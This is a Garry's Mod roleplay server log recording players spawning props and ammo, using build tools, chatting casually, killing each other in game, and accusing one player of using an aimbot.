+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/props_junk/plasticcrate01a.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube025x125x025.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:32] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:48] bobbicus has a wonderful voice: !??!
+[18:49:58] bobbicus has a wonderful voice: I made it man, its called "Rope monster tight"
+[18:49:59] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence03a.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence03a.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:59] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/props_junk/plasticcrate01a.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube025x125x025.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:50:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:50:15] Thomasツ<STEAM_0:0:121940340> used the tool colour on models/props_c17/fence01a.mdl
+[18:50:16] bobbicus has a wonderful voice: theres also a loose one
+[18:50:38] Thomasツ: // found a dupe that works
+[18:50:40] Thomasツ: !cloak xd
+[18:50:47] Thomasツ: <hsv> ee </hsv>
+[18:50:58] bobbicus has a wonderful voice: // what do you mean one that works
+[18:51:18] Thomasツ: // doesnt hit limit
+[18:51:23] DrDerpenstein killed bobbicus has a wonderful voice using player
+[18:51:24] Thomasツ killed DrDerpenstein using player
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_bishop.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_king.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_bishop.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_rook.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_queen.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_rook.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_knight.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_knight.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_bishop.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_queen.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_pawn.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_king.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_rook.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_knight.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_knight.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/black_rook.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_bishop.mdl
+[18:51:48] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/props_phx/games/chess/white_pawn.mdl
+[18:52:06] Derp<STEAM_0:0:52504530> spawned model models/props_c17/gaspipes006a.mdl
+[18:52:10] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on maps/rp_downtown_tits_v2.bsp
+[18:52:11] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on maps/rp_downtown_tits_v2.bsp
+[18:52:14] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on maps/rp_downtown_tits_v2.bsp
+[18:52:24] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:52:24] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/gibs/hgibs.mdl
+[18:52:29] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/props_junk/plasticcrate01a.mdl
+[18:52:29] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/props_junk/plasticcrate01a.mdl
+[18:52:29] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/props_junk/plasticcrate01a.mdl
+[18:52:29] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/props_junk/plasticcrate01a.mdl
+[18:52:29] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/props_junk/plasticcrate01a.mdl
+[18:52:29] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:52:29] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/gibs/hgibs.mdl
+[18:52:30] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/props_junk/plasticcrate01a.mdl
+[18:52:30] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/props_junk/plasticcrate01a.mdl
+[18:52:30] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/props_junk/plasticcrate01a.mdl
+[18:52:32] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/props_junk/plasticcrate01a.mdl
+[18:52:32] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/props_junk/plasticcrate01a.mdl
+[18:53:02] bobbicus has a wonderful voice: rope dude
+[18:53:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[18:53:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[18:53:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[18:53:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[18:53:18] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[18:53:19] bobbicus has a wonderful voice: there are trails just not a proper tool i dont think
+[18:53:20] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[18:53:20] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[18:53:20] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[18:53:20] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[18:53:20] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[18:53:31] Thomasツ<STEAM_0:0:121940340> used the tool fading_door on models/props_c17/fence01a.mdl
+[18:53:38] Thomasツ killed bobbicus has a wonderful voice using player
+[18:54:09] bobbicus has a wonderful voice killed Derp using player
+[18:54:10] bobbicus has a wonderful voice killed DrDerpenstein using player
+[18:54:18] bobbicus has a wonderful voice: /buypistolammo
+[18:54:20] bobbicus has a wonderful voice: /buypistol
+[18:54:22] bobbicus has a wonderful voice: /pistolammo
+[18:54:24] bobbicus has a wonderful voice: shit
+[18:54:26] Thomasツ<STEAM_0:0:121940340> used the tool colour on models/props_c17/fence01a.mdl
+[18:54:35] Thomasツ<STEAM_0:0:121940340> used the tool colour on models/props_c17/fence01a.mdl
+[18:54:37] Thomasツ<STEAM_0:0:121940340> used the tool colour on models/props_c17/fence01a.mdl
+[18:54:38] bobbicus has a wonderful voice killed Thomasツ using player
+[18:54:44] Thomasツ: // reeeeee my gun
+[18:55:25] Thomasツ: // can i get a gun again
+[18:55:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x05.mdl
+[18:55:42] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on maps/rp_downtown_tits_v2.bsp
+[18:55:43] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on maps/rp_downtown_tits_v2.bsp
+[18:55:43] bobbicus has a wonderful voice: /drop
+[18:55:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[18:55:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[18:55:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[18:55:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[18:55:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[18:55:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[18:55:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[18:55:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[18:55:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[18:55:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[18:55:50] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[18:55:50] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[18:55:50] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[18:55:51] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[18:55:51] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[18:55:51] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[18:55:51] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[18:55:51] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[18:55:51] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[18:55:52] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[18:55:52] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[18:55:52] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[18:55:52] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[18:56:13] Derp<STEAM_0:0:52504530> spawned vehicle models/vehicles/prisoner_pod_inner.mdl
+[18:56:19] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:56:24] Derp: hop on in
+[18:56:27] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube3x3x025.mdl
+[18:56:27] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube3x3x025.mdl
+[18:56:27] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube3x3x025.mdl
+[18:56:27] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube3x3x025.mdl
+[18:56:27] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube3x3x025.mdl
+[18:56:28] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube3x3x025.mdl
+[18:56:28] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube3x3x025.mdl
+[18:56:28] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube3x3x025.mdl
+[18:56:33] Thomasツ<STEAM_0:0:121940340> used the tool material on models/hunter/blocks/cube3x3x025.mdl
+[18:56:37] Thomasツ<STEAM_0:0:121940340> used the tool weld on models/hunter/blocks/cube3x3x025.mdl
+[18:56:37] Thomasツ<STEAM_0:0:121940340> used the tool weld on maps/rp_downtown_tits_v2.bsp
+[18:57:05] Thomasツ killed Derp using player
+[18:57:11] DrDerpenstein<STEAM_0:0:13562763> used the tool nocollide on maps/rp_downtown_tits_v2.bsp
+[18:57:11] DrDerpenstein<STEAM_0:0:13562763> used the tool nocollide on models/vehicles/prisoner_pod_inner.mdl
+[18:58:35] Thomasツ: // these printers suck ass
+[18:58:44] DrDerpenstein: // our economy is balanced
+[18:58:52] DrDerpenstein: // they provide plenty of money
+[18:59:08] bobbicus has a wonderful voice: i think you might be lagging
+[18:59:14] DrDerpenstein: im fine
+[18:59:23] bobbicus has a wonderful voice: i am too dw
+[19:00:22] Thomasツ killed bobbicus has a wonderful voice using player
+[19:00:39] Thomasツ: /invholster
+[19:00:44] bobbicus has a wonderful voice: dude you lagging
+[19:00:54] Thomasツ: /invholsyer
+[19:00:55] Thomasツ: /invholster
+[19:00:56] DrDerpenstein: i think u are
+[19:01:10] bobbicus has a wonderful voice: I am not!
+[19:02:12] Thomasツ killed bobbicus has a wonderful voice using player
+[19:02:14] bobbicus has a wonderful voice: TOMMY
+[19:02:26] Thomasツ: /pm bob what
+[19:02:37] Thomasツ: /pm bob who dis
+[19:03:09] DrDerpenstein: // brb
+[19:03:12] Dropped "DrDerpenstein" from server<STEAM_0:0:13562763>
+[19:03:33] bobbicus has a wonderful voice killed Thomasツ using player
+[19:03:48] Thomasツ: // bruh moment
+[19:04:16] Thomasツ: // i lost my guns they wouldnt go in my inv
+[19:04:23] bobbicus has a wonderful voice: // i took them
+[19:04:36] bobbicus has a wonderful voice killed Derp using player
+[19:05:04] Client "DrDerpenstein sups.gg" connected.
+[19:05:34] Client "DrDerpenstein sups.gg" spawned in server <STEAM_0:0:13562763> (took 30 seconds).
+[19:05:56] Dropped "bobbicus has a wonderful voice" from server<STEAM_0:1:179345279>
+[19:09:14] DrDerpenstein killed Derp using player
+[19:09:18] Client "bert simson" connected.
+[19:09:24] Client "bert simson" connected.
+[19:09:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[19:09:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[19:09:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthkit
+[19:09:50] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:09:50] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:09:51] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:09:51] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:09:51] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:09:51] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[19:09:53] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_grenade
+[19:09:53] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_grenade
+[19:09:53] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_grenade
+[19:09:53] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[19:09:54] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[19:09:54] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[19:09:54] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[19:09:54] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[19:09:55] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[19:09:55] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:09:55] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[19:09:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[19:09:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[19:09:59] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[19:10:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[19:10:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[19:10:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[19:10:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[19:10:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[19:10:00] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[19:10:01] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[19:10:01] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[19:10:59] Thomasツ: // why is this inv pickup not working
+[19:11:14] Thomasツ: // it onlky works every once i na while
+[19:11:55] Thomasツ: /invholster
+[19:12:02] Thomasツ: /invholster
+[19:12:13] Thomasツ: /invhoklster
+[19:12:15] Thomasツ: /invholster
+[19:12:45] Client "bert simson" spawned in server <STEAM_0:1:179345279> (took 201 seconds).
+[19:14:21] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:14:25] bobbicus has a wonderful voice killed Derp using player
+[19:14:31] DrDerpenstein: /advert WHYYYYY
+[19:14:43] bobbicus has a wonderful voice: // accident sorry
+[19:14:53] bobbicus has a wonderful voice: /drop
+[19:15:02] DrDerpenstein killed bobbicus has a wonderful voice using player
+[19:15:52] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:15:55] bobbicus has a wonderful voice killed Derp using player
+[19:16:04] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:16:10] bobbicus has a wonderful voice killed Thomasツ using player
+[19:16:18] bobbicus has a wonderful voice killed Derp using player
+[19:16:19] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:16:44] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:17:33] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:17:44] bobbicus has a wonderful voice killed Thomasツ using player
+[19:17:50] bobbicus has a wonderful voice killed Derp using player
+[19:18:02] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:18:26] bobbicus has a wonderful voice killed DrDerpenstein using player
+[19:18:35] bobbicus has a wonderful voice killed Derp using player
+[19:18:48] bobbicus has a wonderful voice killed Thomasツ using player
+[19:18:54] Thomasツ: // what gun does he have
+[19:18:59] Derp killed bobbicus has a wonderful voice using player
+[19:19:00] DrDerpenstein: // not sure
+[19:19:03] DrDerpenstein: // glock?
+[19:19:05] Derp: // he has the aimbot gun
+[19:19:05] Thomasツ: // its op as fuck
+[19:19:09] Thomasツ: // oh
+[19:19:18] Derp: // nah seriously hes actually using aimbot
+[19:19:18] bobbicus has a wonderful voice: // what is aimbot gun wtf?!
+[19:19:34] DrDerpenstein killed bobbicus has a wonderful voice using player
+[19:19:42] DrDerpenstein killed Derp using player
+[19:19:47] Thomasツ: // can i have it?
+[19:19:49] bobbicus has a wonderful voice: // dUde you can screengrab me im using pink
+[19:19:55] bobbicus has a wonderful voice: // blue
+[19:19:57] bobbicus has a wonderful voice: // orange
+[19:19:59] bobbicus has a wonderful voice: // purple
+[19:20:05] Thomasツ: // can i have it?
+[19:20:06] Derp: // i cant screengrab an aimbot
+[19:20:11] bobbicus has a wonderful voice: // sure you can
+[19:20:19] Thomasツ<STEAM_0:0:121940340> spawned/gave himself swep weapon_stungun
+[19:20:27] Thomasツ: // can i have a stun gun
+[19:20:41] Derp<STEAM_0:0:52504530> used the tool creator on maps/rp_downtown_tits_v2.bsp
+[19:20:41] Derp<STEAM_0:0:52504530> spawned/gave himself swep weapon_stungun
+[19:20:51] bobbicus has a wonderful voice: Yeah dude he thinks im hacking
+[19:20:53] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep weapon_adv_keys
+[19:20:55] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep weapon_stungun
+[19:21:02] bobbicus has a wonderful voice: I can moonwalk with that stungun
+[19:21:03] bobbicus has a wonderful voice: give me it
+[19:21:16] bobbicus has a wonderful voice: hahaha
+[19:21:18] bobbicus has a wonderful voice: yeah i know
+[19:21:29] bobbicus has a wonderful voice: i went big blatant
+[19:21:52] Thomasツ: // give me cw_ws_m16a4
+[19:22:04] bobbicus has a wonderful voice: /drop
+[19:22:06] bobbicus has a wonderful voice: there
+[19:22:07] bobbicus has a wonderful voice: you go
+[19:22:11] bobbicus has a wonderful voice: i spawn it for you
+[19:22:18] bobbicus has a wonderful voice: // give me a stungun man
+[19:22:22] Derp killed DrDerpenstein using weapon_fists
+[19:22:31] bobbicus has a wonderful voice: @ i need a stun gun
+[19:22:31] bobbicus has a wonderful voice to admins: i need a stun gun
+[19:22:39] DrDerpenstein: // pay for one
+[19:22:44] bobbicus has a wonderful voice: // where at
+[19:23:39] Thomasツ: // icant even afford ammo :/
+[19:23:52] DrDerpenstein: /dropmoney 20000
+[19:24:15] Derp killed bobbicus has a wonderful voice using weapon_fists
+[19:24:27] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep cw_ws_m16a4
+[19:24:29] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep cw_nen_glock17
+[19:24:33] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[19:24:33] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[19:24:33] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[19:24:33] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[19:24:35] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[19:24:35] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[19:24:36] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[19:24:36] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[19:24:36] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[19:24:36] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[19:24:36] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[19:24:37] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[19:24:37] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[19:24:37] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[19:24:37] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[19:24:38] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[19:24:38] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[19:24:38] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
